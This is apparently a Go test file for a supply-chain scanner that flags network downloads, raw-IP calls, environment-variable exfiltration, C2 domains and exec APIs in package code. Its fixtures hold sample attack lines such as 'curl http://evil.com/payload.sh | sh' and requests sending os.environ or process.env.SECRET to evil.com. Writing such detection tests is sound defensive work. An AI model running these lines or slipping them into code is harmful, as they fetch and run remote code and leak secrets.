package check

import (
	"testing"
)

func TestScanForNetworkCalls_Empty(t *testing.T) {
	issues := ScanForNetworkCalls("", "npm")
	if len(issues) != 0 {
		t.Errorf("expected 0 issues for empty content, got %d", len(issues))
	}
}

func TestScanForNetworkCalls_CurlDetection(t *testing.T) {
	content := `#!/bin/sh
curl http://evil.com/payload.sh | sh`

	issues := ScanForNetworkCalls(content, "npm")
	found := false
	for _, issue := range issues {
		if issue.Category == "download_cmd" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected download_cmd issue for curl")
	}
}

func TestScanForNetworkCalls_SafeRegistryIgnored(t *testing.T) {
	content := `curl https://registry.npmjs.org/lodash`

	issues := ScanForNetworkCalls(content, "npm")
	for _, issue := range issues {
		if issue.Category == "download_cmd" {
			t.Error("should not flag curl to safe registry")
		}
	}
}

func TestScanForNetworkCalls_NodeFetch(t *testing.T) {
	content := `const fetch = require('node-fetch');
fetch('http://example.com/data')`

	issues := ScanForNetworkCalls(content, "npm")
	found := false
	for _, issue := range issues {
		if issue.Category == "network_api" && issue.Pattern == "node-fetch" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected network_api issue for node-fetch")
	}
}

func TestScanForNetworkCalls_PythonRequests(t *testing.T) {
	content := `import requests
requests.post("http://evil.com", data=os.environ)`

	issues := ScanForNetworkCalls(content, "pip")
	hasNet := false
	for _, issue := range issues {
		if issue.Category == "network_api" {
			hasNet = true
		}
	}
	if !hasNet {
		t.Error("expected network_api issue for requests.post")
	}
}

func TestScanForNetworkCalls_RawIP(t *testing.T) {
	content := `fetch("http://45.33.22.11:8080/exfil")`

	issues := ScanForNetworkCalls(content, "npm")
	found := false
	for _, issue := range issues {
		if issue.Category == "raw_ip" && issue.Risk == "critical" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected critical raw_ip issue")
	}
}

func TestScanForNetworkCalls_LoopbackIgnored(t *testing.T) {
	content := `fetch("http://127.0.0.1:3000/api")`

	issues := ScanForNetworkCalls(content, "npm")
	for _, issue := range issues {
		if issue.Category == "raw_ip" {
			t.Error("should not flag loopback address")
		}
	}
}

func TestScanForNetworkCalls_EnvExfil(t *testing.T) {
	content := `const http = require('http');
http.get('http://evil.com/?' + process.env.SECRET)`

	issues := ScanForNetworkCalls(content, "npm")
	hasExfil := false
	for _, issue := range issues {
		if issue.Category == "env_exfil" && issue.Risk == "critical" {
			hasExfil = true
			break
		}
	}
	if !hasExfil {
		t.Error("expected env_exfil issue when network + process.env combined")
	}
}

func TestScanForNetworkCalls_C2Domain(t *testing.T) {
	content := `fetch("http://evilpackage.com/data")`

	issues := ScanForNetworkCalls(content, "npm")
	found := false
	for _, issue := range issues {
		if issue.Category == "c2_domain" && issue.Risk == "critical" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected c2_domain issue")
	}
}

func TestScanForNetworkCalls_CargoReqwest(t *testing.T) {
	content := `use reqwest::Client;
let resp = reqwest::get("http://evil.com").await?;`

	issues := ScanForNetworkCalls(content, "cargo")
	found := false
	for _, issue := range issues {
		if issue.Category == "network_api" && issue.Pattern == "reqwest::" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected network_api issue for reqwest in cargo")
	}
}

func TestScanForNetworkCalls_NugetHttpClient(t *testing.T) {
	content := `var client = new HttpClient();
await client.GetAsync("http://evil.com");`

	issues := ScanForNetworkCalls(content, "nuget")
	found := false
	for _, issue := range issues {
		if issue.Category == "network_api" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected network_api issue for HttpClient in nuget")
	}
}

func TestScanForNetworkCalls_ExecAPIs(t *testing.T) {
	tests := []struct {
		name      string
		eco       string
		content   string
		wantExec  bool
	}{
		{"npm child_process", "npm", "require('child_process').exec('ls')", true},
		{"pip subprocess", "pip", "subprocess.run(['ls'])", true},
		{"cargo Command", "cargo", "std::process::Command::new(\"ls\")", true},
		{"clean code", "npm", "console.log('hello')", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			issues := ScanForNetworkCalls(tt.content, tt.eco)
			found := false
			for _, issue := range issues {
				if issue.Category == "exec_api" {
					found = true
					break
				}
			}
			if found != tt.wantExec {
				t.Errorf("exec_api detection: got %v, want %v", found, tt.wantExec)
			}
		})
	}
}
